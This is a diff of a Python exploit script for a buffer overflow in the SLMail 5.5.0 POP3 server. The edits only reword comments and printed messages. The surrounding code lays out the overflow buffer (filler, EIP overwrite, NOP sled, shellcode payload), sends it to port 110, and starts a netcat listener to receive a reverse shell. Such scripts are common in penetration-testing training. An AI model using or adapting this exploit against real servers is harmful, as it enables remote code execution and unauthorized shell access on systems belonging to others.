@@ -70,7 +70,7 @@ payload += "\x42\xa9\xf7"
 #----------------------------#
 # buffer = AAA...........AAA #
 # buffer = EIP               #
-# buffer = NOPS              #
+# buffer = NOPSled           #
 # buffer = payload           #
 # buffer = BBB...........BBB #
 #----------------------------#
@@ -84,7 +84,7 @@ buffer += "B" * (3500-2606-4-40-len(payload))
 
 try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  print "[+] Connected to SLMail_5.5.0 Server with an IP Address %s on port 110" %HOST
+  print "[+] Connected to SLMail 5.5.0 Server with an IP Address %s on port 110" %HOST
   time.sleep(2)
   s.connect((HOST,110))
   data = s.recv(1024)
@@ -96,6 +96,6 @@ try:
   print "[+] Incoming shell <(^,^)>"
   subprocess.call(['nc -lnvp 1337'], shell=True)
 except:
-  print "Could not connect to SLMail_5.5.0 Server (._.)"
+  print "Could not connect to SLMail 5.5.0 Server (._.)"
 
 
